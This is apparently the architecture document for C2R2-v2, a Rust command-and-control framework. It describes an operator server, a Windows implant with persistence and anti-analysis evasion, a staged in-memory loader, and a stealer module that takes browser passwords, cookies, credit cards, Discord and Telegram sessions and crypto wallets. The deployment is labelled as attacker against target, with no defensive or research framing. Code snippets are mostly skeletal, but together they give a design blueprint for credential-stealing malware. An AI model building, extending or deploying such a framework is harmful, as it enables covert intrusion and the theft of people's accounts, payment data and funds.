# System Architecture

This document describes the architecture, design decisions, and component interactions of C2R2-v2.

## Overview

C2R2-v2 follows a modular client-server architecture optimized for stealth, flexibility, and maintainability. The framework is built entirely in Rust, leveraging memory safety, zero-cost abstractions, and powerful concurrency primitives.

## Table of Contents

1. [High-Level Architecture](#high-level-architecture)
2. [Component Architecture](#component-architecture)
3. [Multi-Stage Execution Pipeline](#multi-stage-execution-pipeline)
4. [Data Flow](#data-flow)
5. [Security Architecture](#security-architecture)
6. [Extensibility](#extensibility)
7. [Performance Considerations](#performance-considerations)
8. [Build System](#build-system)
9. [Deployment Architecture](#deployment-architecture)
10. [Logging and Debugging](#logging-and-debugging)
11. [Error Handling](#error-handling)
12. [Future Architecture Considerations](#future-architecture-considerations)

## High-Level Architecture

```
                                 ┌─────────────────┐
                                 │   Operator      │
                                 │   (Terminal)    │
                                 └────────┬────────┘
                                          │
                                          │ Commands
                                          ▼
                            ┌──────────────────────────┐
                            │     C2 Server            │
                            │   (c2r2-server)          │
                            │                          │
                            │  - Multi-client handler  │
                            │  - Command dispatcher    │
                            │  - Module server         │
                            │  - Logging system        │
                            └──────────┬───────────────┘
                                       │
                        ┌──────────────┴──────────────┐
                        │                             │
                   Beacon/Jitter                 Beacon/Jitter
                        │                             │
                        ▼                             ▼
              ┌──────────────────┐          ┌──────────────────┐
              │  Agent Instance  │          │  Agent Instance  │
              │  (Target 1)      │          │  (Target 2)      │
              │                  │          │                  │
              │  - Beacon loop   │          │  - Beacon loop   │
              │  - Cmd executor  │          │  - Cmd executor  │
              │  - File transfer │          │  - File transfer │
              │  - Persistence   │          │  - Persistence   │
              └────────┬─────────┘          └────────┬─────────┘
                       │                              │
              Module Loading                 Module Loading
                       │                              │
                       ▼                              ▼
              ┌──────────────────┐          ┌──────────────────┐
              │  Stealer Module  │          │  Stealer Module  │
              │  (stealer.dll)   │          │  (stealer.dll)   │
              │                  │          │                  │
              │  - Browser steal │          │  - Browser steal │
              │  - Discord steal │          │  - Discord steal │
              │  - Telegram steal│          │  - Telegram steal│
              │  - Wallet steal  │          │  - Wallet steal  │
              └──────────────────┘          └──────────────────┘
```

## Component Architecture

### 1. C2 Server (`c2r2-server`)

**Purpose**: Central command and control server that manages all agent connections and operator interactions.

**Key Technologies**:
- `tokio` - Async runtime for concurrent client handling
- `rustyline` - Interactive CLI with history
- `tracing` - Structured logging
- `prettytable-rs` - Formatted table output

**Architecture**:

```rust
┌─────────────────────────────────────────┐
│         Main Thread (CLI Loop)          │
│                                         │
│  - Read operator commands               │
│  - Parse and validate input             │
│  - Display results and tables           │
│  - Logging coordination                 │
└────────────────┬────────────────────────┘
                 │
                 │ Channel communication
                 ▼
┌─────────────────────────────────────────┐
│      Tokio Runtime (Server Thread)      │
│                                         │
│  ┌──────────────────────────────────┐  │
│  │   TCP Listener (0.0.0.0:4444)   │  │
│  └────────────┬─────────────────────┘  │
│               │                         │
│               │ Accept connections      │
│               ▼                         │
│  ┌──────────────────────────────────┐  │
│  │   Client Handler (per agent)    │  │
│  │                                  │  │
│  │  - Receive agent registration   │  │
│  │  - Queue commands               │  │
│  │  - Collect responses            │  │
│  │  - Handle disconnections        │  │
│  └──────────────────────────────────┘  │
└─────────────────────────────────────────┘
```

**Client Management**:

```rust
pub struct ClientInfo {
    id: ClientId,
    stream: TcpStream,
    hostname: String,
    username: String,
    os: String,
    privileges: String,
    connected_at: DateTime<Local>,
}

pub struct ClientRegistry {
    clients: HashMap<ClientId, Arc<Mutex<ClientInfo>>>,
    next_id: ClientId,
}
```

**Command Flow**:
1. Operator enters command in CLI
2. Server validates and queues command for target agent(s)
3. Agent polls and receives command on next beacon
4. Agent executes and returns result
5. Server displays result to operator

### 2. Agent (`agent`)

**Purpose**: Lightweight implant that runs on target systems and provides remote access capabilities.

**Key Technologies**:
- `winapi` - Windows API bindings
- `obfstr` - Compile-time string obfuscation
- `rand` - Random number generation for jitter

**Architecture**:

```rust
┌────────────────────────────────────────┐
│         Agent Main Loop                │
│                                        │
│  loop {                                │
│    connect_to_c2()                     │
│    send_system_info()                  │
│    beacon_loop()                       │
│    sleep_with_jitter()                 │
│  }                                     │
└───────────┬────────────────────────────┘
            │
            ├─► Beacon Module
            │   - Configurable intervals
            │   - Jitter calculation
            │   - Exponential backoff
            │
            ├─► Command Executor
            │   - cmd.exe invocation
            │   - Output capture
            │   - Error handling
            │
            ├─► File Transfer
            │   - Base64 encoding/decoding
            │   - Stream processing
            │   - Chunked transfers
            │
            ├─► Persistence Manager
            │   - Registry keys
            │   - Scheduled tasks
            │   - WMI events
            │   - Startup folder
            │
            ├─► Evasion Module
            │   - Direct syscalls
            │   - Process checks
            │   - Sandbox detection
            │
            └─► Module Loader
                - Decrypt module
                - Load into memory
                - Execute exported functions
```

**Key Modules**:

- **`beacon.rs`**: Implements beacon timing logic with jitter
- **`persistence.rs`**: Multiple persistence mechanisms
- **`argfuscator.rs`**: Command obfuscation techniques
- **`syscalls.rs`**: Direct system call wrappers
- **`evasion.rs`**: Anti-analysis and evasion techniques

**Beacon Algorithm**:

```rust
fn calculate_sleep_duration(config: &BeaconConfig) -> Duration {
    let base = config.interval;
    let jitter_percent = config.jitter_percent;
    
    // Calculate jitter range: ±jitter_percent%
    let jitter_range = (base * jitter_percent) / 100;
    let min_sleep = base.saturating_sub(jitter_range);
    let max_sleep = base + jitter_range;
    
    // Random sleep duration within range
    let sleep = rand::thread_rng().gen_range(min_sleep..=max_sleep);
    Duration::from_secs(sleep)
}
```

### 3. Builder (`builder`)

**Purpose**: Tool for generating configured agents and managing encryption keys.

**Key Technologies**:
- `clap` - CLI argument parsing
- `aes-gcm` - AES-256-GCM encryption
- `rand` - Cryptographic random number generation

**Functions**:

1. **Agent Building**:
   - Compile agent with embedded C2 server address
   - Optimize binary size
   - Strip debug symbols
   - Apply obfuscation

2. **Module Encryption**:
   - Generate random AES-256 key
   - Encrypt DLL modules with GCM mode
   - Save key separately for server use

3. **Configuration**:
   - Set beacon intervals
   - Configure jitter percentages
   - Customize persistence methods

**Build Process**:

```
Source Code → Compilation → Optimization → Obfuscation → Output
                  │              │              │
                  ▼              ▼              ▼
              agent.exe      Strip symbols  Encrypt strings
                (~60KB)     LTO enabled    Hide imports
```

### 4. Stealer DLL (`stealer-dll`)

**Purpose**: Modular credential harvesting capability loaded on-demand.

**Key Technologies**:
- `rusqlite` - SQLite database access for browsers
- `winapi` - Windows DPAPI for credential decryption
- `aes-gcm` - AES decryption for browser data

**Supported Targets**:

```
┌────────────────────┐
│  Chromium-based    │
│  - Google Chrome   │
│  - Microsoft Edge  │
│  - Brave           │
│  - Opera           │
│  - Vivaldi         │
└────────────────────┘

┌────────────────────┐
│  Firefox-based     │
│  - Mozilla Firefox │
│  - Waterfox        │
│  - LibreWolf       │
└────────────────────┘

┌────────────────────┐
│  Communication     │
│  - Discord         │
│  - Telegram        │
└────────────────────┘

┌────────────────────┐
│  Cryptocurrency    │
│  - Exodus          │
│  - Atomic Wallet   │
│  - Electrum        │
└────────────────────┘

┌────────────────────┐
│  Gaming            │
│  - Steam           │
│  - Epic Games      │
└────────────────────┘
```

**Stealer Architecture**:

```rust
pub struct StolenData {
    passwords: Vec<Password>,
    cookies: Vec<Cookie>,
    autofill: Vec<AutofillEntry>,
    credit_cards: Vec<CreditCard>,
    discord_tokens: Vec<String>,
    telegram_sessions: Vec<String>,
    wallets: Vec<WalletData>,
}

impl StolenData {
    pub fn steal_all() -> Self {
        // Parallel collection from all sources
        let passwords = steal_passwords();
        let cookies = steal_cookies();
        let autofill = steal_autofill();
        let cards = steal_credit_cards();
        let discord = steal_discord_tokens();
        let telegram = steal_telegram_sessions();
        let wallets = steal_crypto_wallets();
        
        Self {
            passwords,
            cookies,
            autofill,
            credit_cards: cards,
            discord_tokens: discord,
            telegram_sessions: telegram,
            wallets,
        }
    }
}
```

## Multi-Stage Execution Pipeline

C2R2-v2 includes a multi-stage execution pipeline inspired by IRIS C2, providing layered OPSEC and clean separation of concerns. See [STAGING.md](STAGING.md) for complete documentation.

### Stage Architecture

```
┌──────────────────────────────────────────────────────┐
│  Stage 1: ESTER (Entry/Dropper)                      │
│  - Environment validation                            │
│  - Sandbox detection                                 │
│  - Triggers Stage 2                                  │
│  - NO C2 communication                               │
│  - Runs on disk (entry point)                        │
└─────────────────┬────────────────────────────────────┘
                  │ Executes in memory
                  ▼
┌──────────────────────────────────────────────────────┐
│  Stage 2: JAVELIN (In-Memory Loader)                 │
│  - XOR/AES payload decryption                        │
│  - RW → RX memory transitions                        │
│  - Artifact cleanup                                  │
│  - NO C2 communication                               │
│  - Runs entirely in memory                           │
└─────────────────┬────────────────────────────────────┘
                  │ Loads and executes
                  ▼
┌──────────────────────────────────────────────────────┐
│  Stage 3: Stage0 (Bootstrap)                         │
│  - Initial C2 beacon                                 │
│  - TLS session establishment                         │
│  - Downloads full agent                              │
│  - Position-independent code                         │
│  - Runs entirely in memory                           │
└─────────────────┬────────────────────────────────────┘
                  │ Downloads and executes
                  ▼
┌──────────────────────────────────────────────────────┐
│  Full Agent (Standard C2R2-v2 Agent)                 │
│  - All agent capabilities                            │
│  - Beacon loop with jitter                           │
│  - Command execution                                 │
│  - Module loading                                    │
└──────────────────────────────────────────────────────┘
```

### Key Characteristics

| Stage | Disk | Memory | C2 Comms | Purpose |
|-------|------|--------|----------|---------|
| ESTER | ✅ | - | ❌ | Environment validation |
| JAVELIN | ❌ | ✅ | ❌ | Payload decryption & loading |
| Stage0 | ❌ | ✅ | ✅ | C2 bootstrap & agent download |
| Full Agent | ❌ | ✅ | ✅ | Complete capabilities |

### Why Multi-Stage?

**Separation of Concerns**:
- ESTER: Environment validation only
- JAVELIN: Payload loading only  
- Stage0: C2 communication only
- Full Agent: All capabilities

**OPSEC Benefits**:
- Minimal disk footprint (only ESTER)
- No C2 addresses in early stages
- Layered evasion techniques
- Full agent only deployed when needed

**Flexibility**:
- Stages can be updated independently
- Different staging strategies for different scenarios
- Reusable components

## Data Flow

### Command Execution Flow

```
Operator → Server → Agent → cmd.exe → Agent → Server → Operator
   │         │        │        │         │        │         │
   │         │        │        │         │        │         │
   ▼         ▼        ▼        ▼         ▼        ▼         ▼
/cmd dir   Queue   Receive  Execute   Capture  Display  View
           cmd     on       command   output   result   output
                   beacon
```

### File Download Flow

```
Operator → Server → Agent → File System → Agent → Server → Operator
   │         │        │           │          │        │         │
   │         │        │           │          │        │         │
   ▼         ▼        ▼           ▼          ▼        ▼         ▼
/download  Queue   Receive     Read file   Base64   Decode   Save to
file.txt   cmd     __DOWNLOAD__           encode   transfer  disk
```

### Harvest Flow

```
Operator → Server → Agent → Stealer DLL → Agent → Server → Operator
   │         │        │          │           │        │         │
   │         │        │          │           │        │         │
   ▼         ▼        ▼          ▼           ▼        ▼         ▼
/harvest  Upload   Decrypt   Load DLL    Execute   Collect   Display
          module    module   into mem    steal_*   results   stolen
          (.enc)                                              data
```

## Security Architecture

### Defense Evasion Techniques

1. **Direct Syscalls**
   - Bypass userland API hooks
   - Direct invocation of `ntdll.dll` functions
   - Evade EDR/AV monitoring

2. **String Obfuscation**
   - Compile-time encryption with `obfstr!` macro
   - Runtime decryption on use
   - Prevents static string analysis

3. **Command Obfuscation (ArgFuscator)**
   - Random case changes: `whoami` → `wHoAmI`
   - Caret insertion: `whoami` → `who^am^i`
   - Quote wrapping: `whoami` → `"w"h"o"a"m"i`
   - Environment variables: `cmd` → `%COMSPEC%`

4. **Module Encryption**
   - AES-256-GCM encryption for DLLs
   - Modules loaded directly into memory
   - No disk writes for sensitive capabilities

5. **Beacon with Jitter**
   - Randomized check-in times
   - Exponential backoff on failures
   - Reduces network signature

### OPSEC Considerations

**Anti-Analysis**:
- No hardcoded strings for sensitive operations
- Minimal disk footprint
- Process name randomization (planned)
- Parent process spoofing (planned)

**Network OPSEC**:
- Configurable beacon intervals
- Jitter to avoid patterns
- Connection retry with backoff
- Support for multiple protocols (planned)

**Host OPSEC**:
- Minimal event log generation
- No unnecessary registry writes
- Memory-only module loading
- Clean teardown on exit

## Extensibility

### Adding New Modules

1. Create new workspace member in `Cargo.toml`
2. Implement module with exported C functions
3. Build as DLL with cross-compilation
4. Encrypt module with builder
5. Add command handler in server
6. Implement loader in agent

Example module structure:

```rust
#[no_mangle]
pub extern "C" fn module_init() -> i32 {
    // Module initialization
    0
}

#[no_mangle]
pub extern "C" fn module_execute() -> *mut c_char {
    // Module main functionality
    let result = do_something();
    CString::new(result).unwrap().into_raw()
}

#[no_mangle]
pub extern "C" fn module_cleanup() {
    // Cleanup resources
}
```

### Adding New Commands

Server side (`c2r2-server/src/main.rs`):

```rust
"/newcommand" => {
    if let Some(client) = &selected_client {
        let command = format!("__NEWCOMMAND__:{}\n", args);
        send_command(client, &command).await;
    }
}
```

Agent side (`agent/src/main.rs`):

```rust
if command.starts_with("__NEWCOMMAND__:") {
    let params = command.strip_prefix("__NEWCOMMAND__:").unwrap();
    let result = handle_newcommand(params);
    writer.write_all(result.as_bytes()).ok();
}
```

## Performance Considerations

### Agent Performance
- **Binary Size**: ~60KB (optimized with LTO and size optimizations)
- **Memory Usage**: <10MB typical runtime
- **CPU Usage**: Minimal, mostly idle with beacon sleep
- **Network Usage**: ~1-5KB per beacon (depending on command)

### Server Performance
- **Concurrent Clients**: 100+ agents per server (tested)
- **CPU Usage**: Low, async I/O with tokio
- **Memory Usage**: ~50MB + ~1MB per connected agent
- **Network**: Handles multiple simultaneous file transfers

### Module Performance
- **Stealer DLL Size**: ~2MB
- **Execution Time**: 1-5 seconds typical harvest
- **Memory Impact**: +10-20MB during execution
- **Cleanup**: Automatic resource release

## Build System

### Cross-Compilation

C2R2-v2 supports building Windows targets from Linux:

```bash
# Add Windows target
rustup target add x86_64-pc-windows-gnu

# Install MinGW
sudo apt install mingw-w64

# Build for Windows
cargo build --target x86_64-pc-windows-gnu --release
```

### Optimization Flags

```toml
[profile.release]
panic = "abort"       # Smaller binary, no unwinding
lto = true            # Link-time optimization
codegen-units = 1     # Single codegen unit for better optimization
opt-level = "z"       # Optimize for size
```

### Build Pipeline

```
1. Compile stealer DLL
   └─► x86_64-pc-windows-gnu target

2. Encrypt module
   └─► AES-256-GCM with random key

3. Build agent
   └─► Embed server address
   └─► Link encrypted strings

4. Build server
   └─► Include modules directory
   └─► Configure logging
```

## Deployment Architecture

### Typical Deployment

```
┌─────────────────┐
│  Kali Linux     │
│  (Attacker)     │
│                 │
│  ┌───────────┐  │
│  │ C2 Server │  │
│  │ :4444     │  │
│  └─────┬─────┘  │
└────────┼────────┘
         │
    Internet/LAN
         │
    ┌────┴──────────────────────┐
    │                           │
┌───▼────────┐          ┌───▼────────┐
│  Target 1  │          │  Target 2  │
│  (Windows) │          │  (Windows) │
│            │          │            │
│  agent.exe │          │  agent.exe │
└────────────┘          └────────────┘
```

### Network Configuration

**Firewall Rules**:
- C2 Server: Allow inbound TCP 4444 (or custom port)
- Agents: Allow outbound TCP to C2 server

**NAT Considerations**:
- Agents behind NAT can connect out
- Server must be publicly accessible or port-forwarded

**Alternative Channels** (Planned):
- HTTP/HTTPS (blends with normal traffic)
- DNS tunneling (highly covert)
- SMB named pipes (lateral movement)

## Logging and Debugging

### Server Logging

```rust
// Configuration via environment or config file
RUST_LOG=info          # Info level and above
RUST_LOG=debug         # Debug level and above
RUST_LOG=trace         # All logs

// Logs stored in: c2r2-server/logs/
// - app.log          (all logs)
// - commands.log     (command history)
// - connections.log  (client events)
```

### Agent Debugging

```rust
// Debug builds include console output
#![windows_subsystem = "console"]  // Show console

// Release builds hide console
#![windows_subsystem = "windows"]  // No console
```

## Error Handling

### Agent Error Strategy

```rust
// Graceful degradation - never panic
match execute_command(cmd) {
    Ok(output) => send_result(output),
    Err(e) => send_error(format!("ERROR:{}", e)),
}

// Continue operation even if module loading fails
match load_module(path) {
    Ok(module) => use_module(module),
    Err(e) => {
        log_error(e);
        return None; // Caller handles gracefully
    }
}
```

### Server Error Strategy

```rust
// Isolate client failures - don't crash server
tokio::spawn(async move {
    if let Err(e) = handle_client(stream).await {
        error!("Client handler error: {}", e);
        // Client disconnects, server continues
    }
});
```

## Future Architecture Considerations

### Planned Improvements

1. **Protocol Abstraction**
   - Support multiple C2 protocols
   - HTTP/HTTPS, DNS, SMB, etc.
   - Protocol-agnostic agent core

2. **Plugin System**
   - Hot-loadable capabilities
   - Module marketplace
   - Community contributions

3. **Web Interface**
   - Modern web UI for operators
   - Multi-user support
   - Real-time updates with WebSockets

4. **Distributed C2**
   - Multiple teamservers
   - Agent relay/pivot capabilities
   - Peer-to-peer agent mesh

5. **Enhanced Evasion**
   - Process injection techniques
   - Memory-only execution
   - Syscall randomization
   - Anti-debugging improvements

## Conclusion

C2R2-v2's architecture is designed for flexibility, stealth, and extensibility. The modular design allows for rapid development of new capabilities while maintaining a small footprint on target systems. The use of Rust provides memory safety and performance, while the async server architecture enables scalable multi-client operations.

For implementation details of specific components, refer to the respective module documentation in the codebase.
